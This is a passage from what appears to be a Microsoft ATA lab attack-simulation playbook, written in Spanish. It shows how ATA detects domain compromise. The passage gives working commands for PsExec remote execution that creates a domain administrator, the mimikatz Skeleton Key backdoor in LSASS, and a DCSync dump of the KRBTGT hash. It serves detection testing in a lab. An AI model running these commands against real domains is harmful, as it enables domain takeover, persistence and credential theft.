Ahora el atacante es, a todos los efectos, *NuckC*. Los administradores son los únicos que deberían tener acceso a la raíz del controlador de dominio.  El atacante está usando credenciales legítimas, con lo cual puede tener acceso a recursos legítimos y abrir archivos ejecutables legítimos. 

La mayoría de los departamentos de TI no se daría cuenta de esta actividad posterior a la infiltración que está teniendo lugar en su entorno.  Microsoft ATA es capaz de detectar esto, tal y como se muestra en la siguiente imagen:

![Infiltración](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig30.png) 

Como se aprecia aquí, Microsoft ATA detectó que los vales de Nuck Chorris se robaron de *ADMIN-PC* y se trasladaron a *VICTIM-PC*.  ATA también informa de los recursos a los que se tuvo acceso con los vales robados.  Así que el usuario no solo tendrá conocimiento del ataque, sino que también dispondrá de información para arrancar su investigación. La siguiente imagen muestra además que ATA es capaz de ver los recursos a los que se tuvo acceso con el ataque pass-the-ticket asociado:

![Recursos](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig31.png) 

Como defensor de la red, esta es una información extremadamente importante en la que centrarse. El atacante accedió al CIFS con el comando "dir \\dc1\c$".  El atacante envió una solicitud LDAP al DC1 local como si fuera el CIFS.  Se usó la cuenta [KRBTGT](https://technet.microsoft.com/library/dn745899%28v=ws.11%29.aspx) para dirigirse directamente al DC1 y autenticarse (algo necesario para acceder a la unidad C$ del controlador de dominio).  De esto, los defensores podemos deducir que la actividad de pass-the-ticket permitió acceder directamente al equipo del DC1.

Llegado este punto, lo que cualquier adversario tratará de hacer será ejecutar código de forma remota en el controlador de dominio. Esto es importante, ya que realizar modificaciones en la capa de identidad hará que sea extremadamente difícil detectar su presencia. Para simular esto, ejecute comandos remotos para agregar un usuario al dominio y agréguelo al grupo de seguridad *Administradores*, usando para ello las credenciales legítimas de NuckC.  Todo esto puede realizarse con herramientas integradas ya existentes, sin necesidad de ningún software malintencionado o de herramientas de investigación.

Ejecute los siguientes comandos desde la ubicación donde esté PsExec en *Victim-PC*:

    psexec \\dc1 -accepteula net user /add InsertedUser pa$$w0rd1
    psexec \\dc1 -accepteula net localgroup “Administrators” InsertedUser /add

En la siguiente imagen se muestra un ejemplo del resultado de este comando:

![psexec](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig32.png) 

El atacante acaba de crear una cuenta de usuario y la ha incluido en el grupo *Administradores*. Queda claro que se ha hecho uso de los privilegios de *admin. del dominio* que ahora posee, a través de la ejecución remota de código.  Y no solo eso, sino que puede crear más *admins. del dominio* y quitar otros.  

Microsoft ATA detectó la ejecución remota realizada en el DC1 de *Victim-PC*.  En la siguiente pantalla de ejemplo, ATA detecta los intentos correctos e incorrectos acometidos por el adversario.

![ejecución remota](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig33.png) 

<a id="domain-dominance" class="xliff"></a>
### Dominación de dominio

El atacante ha sometido el dominio bajo su control, puede ejecutar cualquier código como administrador y acceder a cualquier recurso en el dominio.
 
Pero, para garantizar la persistencia de ese sometimiento, puede poner en marcha puertas traseras y otros mecanismos como garantías de seguridad, por si acaso el método de ataque original se detecta o las credenciales se restablecen de forma aleatoria. En este sentido, se da por hecho que el atacante quiere implementar lo último en puertas traseras en el controlador de dominio, una forma de crear inmediatamente usuarios con privilegios de *administrador*. Este método se conoce como Skeleton Key. 

El siguiente paso será insertar el ataque Skeleton Key en DC1. En primer lugar, copiaremos *mimikatz* en el controlador de dominio. Tenga en cuenta que en esta fase es importante saber si el controlador de dominio es un equipo de 32 o de 64 bits.  En el ejemplo se usa un equipo de 64 bits. Modifíquelo según las necesidades de su entorno en concreto.

    xcopy x64\mimikatz.exe \\dc1\c$\temp\

Tras ello, usaremos *PsExec* para ejecutarlo de forma remota e implementar Skeleton Key con el siguiente comando:

    PsExec \\dc1 -accepteula cmd /c (cd c:\temp ^& mimikatz.exe “privilege::debug” “misc::skeleton” ^& “exit”)

En la siguiente imagen se muestra un ejemplo del resultado de este comando:

![PSExec2](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig34.png) 

El atacante "revisó" el archivo binario LSASS.exe con Skeleton Key.  En este momento, el atacante podría usar Skeleton Key. Para simular esto, abra un símbolo del sistema como *JeffV*.  Primero, confirmaremos que no hay ningún vale de otros usuarios. Este paso sirve solo para confirmar exactamente lo que sucede. Ejecute el siguiente comando en *Victim-PC* como *JeffV*:

    klist

En la siguiente imagen se muestra un ejemplo del resultado de este comando:

![klist nucko](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig35.png) 

Como se muestra en el ejemplo anterior, no hay vales con privilegios elevados.  Esto significa que todos los comandos que el atacante ejecute deben tener solo los privilegios que *JeffV* tiene. Ahora intentaremos autenticarnos en DC1, para lo cual trataremos de asignar la unidad C de DC1.  Usaremos una contraseña incorrecta a propósito para ilustrar que no todas las contraseñas funcionan. Ejecute el siguiente comando desde el mismo símbolo del sistema limpio:

    net use k: \\dc1\c$ wrongpassword /user:Administrator@contoso.local

En la siguiente imagen se muestra un ejemplo del resultado de este comando:

![net use](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig36.png) 

El ejemplo anterior muestra que este comando genera un error, como debe ser.  Pero aquí es donde se usará Skeleton Key. Usaremos el mismo comando otra vez, pero ahora con la clave maestra que acabamos de agregar a cada cuenta autenticada en DC1 donde se insertó Skeleton Key. Desde el símbolo del sistema, ejecute el siguiente comando, pero esta vez usando la clave maestra "mimikatz":

    net use k: \\dc1\c$ mimikatz /user:Administrator@contoso.local

En la siguiente imagen se muestra un ejemplo del resultado de este comando:

![net use 2](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig37.png) 

Con la clave maestra, "mimikatz" (codificada de forma rígida), el atacante podría obtener privilegios de administrador.  Esa clave no es la contraseña de la cuenta, sino una manera de acceder a DC1 con el proceso revisado y autenticar a cualquier usuario como administrador (o como cualquier otro grupo de seguridad). Repare en que ahora hay dos contraseñas activas en cada cuenta:

- La contraseña usuario/administrador creada originalmente
- La clave maestra de Skeleton  

Microsoft ATA será capaz de detectar esta actividad, tal y como se muestra en el siguiente ejemplo:

![Skeleton Key](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig38.png) 

Hasta ahora, todo lo que el atacante ha realizado en el controlador de dominio ha requerido la ejecución de código arbitrario.  ATA detectó estas acciones al marcarlas con el indicador de actividad sospechosa correspondiente, así como al proporcionar información al defensor de la red para ponerles remedio. No obstante, un atacante podría querer seguir avanzando con su intrusión y realizar un ataque más encubierto, uno que no ejecuta código arbitrario en el controlador de dominio (sin *PsExec* o sin insertar la clave de Skeleton Key directamente en el proceso LSASS).
*Mimikatz*, la herramienta de investigación elegida para esta área, tiene una función denominada "DC Sync"  que permite que un atacante con credenciales de administrador de dominio replique y obtenga cualquier credencial, como si fuera un controlador de dominio.

Abra el símbolo del sistema que tiene las credenciales de *NuckC*, vaya a la línea de comandos y asegúrese de que el vale de NuckC todavía está inserto en la sesión, como se muestra en el siguiente ejemplo:

![vale](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig39.png) 

Ahora que sabe que está trabajando desde la consola correcta, puede emular al atacante e intentar obtener lo último en credenciales del dominio: la cuenta [KRBTGT](https://technet.microsoft.com/library/dn745899.aspx#Sec_KRBTGT).  La razón por la que es necesario usar esta cuenta es que con ella puede firmar sus propios vales.

Desde el símbolo del sistema (ahora validado) de *NuckC* en *Victim-PC*, vaya a la ubicación donde se encuentre mimikatz en el sistema de archivos y ejecute el siguiente comando:

    mimikatz.exe “lsadump::dcsync /domain:contoso.local /user:krbtgt “exit” >> krbtgt-export.txt

En la siguiente imagen se muestra un ejemplo del resultado de este comando:

![lsadump](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig40.png) 

Cuando el atacante abra el archivo "krbtgt-export.txt", dispondrá de los detalles de KRBTGT necesarios.  Abra el archivo "krbtgt-export.txt" al que acaba de exportar el hash, como se muestra en el siguiente ejemplo:

![KRBTGT](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig41.png) 

En este punto, el atacante tiene todo lo que necesita para firmar los TGT relativos a cualquier recurso con el hash NTLM robado, sin tener que volver al controlador de dominio.  De esta forma, el atacante se puede convertir en cualquier usuario en cualquier momento que quiera (hasta que la propia cuenta KRBTGT se restablezca, dos veces).

Microsoft ATA es capaz de detectar este tipo de actividad, tal y como se muestra en el siguiente ejemplo:

![Ataque](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig42.png) 

Microsoft ATA no solo detectó el ataque, sino que también proporcionó la información necesaria para tomar las medidas correctivas oportunas.

El uso de la cuenta KRBTGT para firmar vales falsos se conoce como ataque de golden ticket. ATA también lo detecta,  pero por motivos de ámbito y de detecciones basadas en firma, queda fuera del propósito de esta guía.

<a id="conclusion" class="xliff"></a>
## Conclusión

Microsoft ATA ofrece información y conocimientos para defender la red que no se encuentran en ninguna otra herramienta.  Microsoft ATA convierte el plano de identidad en una herramienta de detección muy eficaz que identifica las actividades posteriores a la infiltración en el entorno.  Microsoft ATA sirve para asimilar los eventos de macro y convertirlos rápidamente en historias de ataques.

![Conclusión](./media/ata-attack-simulation-playbook/ata-attack-simulation-playbook-fig43.png) 

Microsoft ATA proporciona la información y la inteligencia necesarias en una era en la que debemos asumir que se producen infracciones de seguridad, donde es imprescindible detectar las actividades posteriores a la infiltración.  Los firewalls, los motores antivirus y los servicios de detección y prevención de intrusiones intentan mantener al atacante fuera, pero apenas sirven de algo cuando el atacante ya está dentro usando herramientas legítimas con credenciales legítimas de forma malintencionada.  En la era de la ciberseguridad, es fundamental entender realmente estas actividades malintencionadas. 

Para obtener más información sobre Microsoft ATA, visite la página de [Microsoft ATA](https://www.microsoft.com/cloud-platform/advanced-threat-analytics) o envíe un correo a ataeval@microsoft.com.




